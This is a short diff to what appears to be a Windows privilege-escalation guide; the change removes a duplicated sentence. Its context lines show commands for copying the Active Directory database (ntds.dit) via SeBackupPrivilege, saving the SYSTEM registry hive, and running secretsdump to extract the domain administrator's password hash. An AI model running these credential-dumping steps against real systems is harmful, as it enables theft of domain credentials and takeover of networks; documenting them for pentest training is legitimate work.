@@ -50,7 +50,7 @@ Copy-FileSeBackupPrivilege z:\windows\NTDS\ntds.dit c:\tmp\ntds.dit - now u got 
 reg save HKLM\system system.save
 ```
 
-Then "secretsdump" will help you get the hash of the domain administrator from ntds.dit without much difficulty =)Then "secretsdump" will help you get the hash of the domain administrator from ntds.dit without much difficulty =)
+Then "secretsdump" will help you get the hash of the domain administrator from ntds.dit without much difficulty =)
 
 ```
 python secretsdump.py -ntds /tmp/ntds.dit -system /tmp/system.save LOCAL
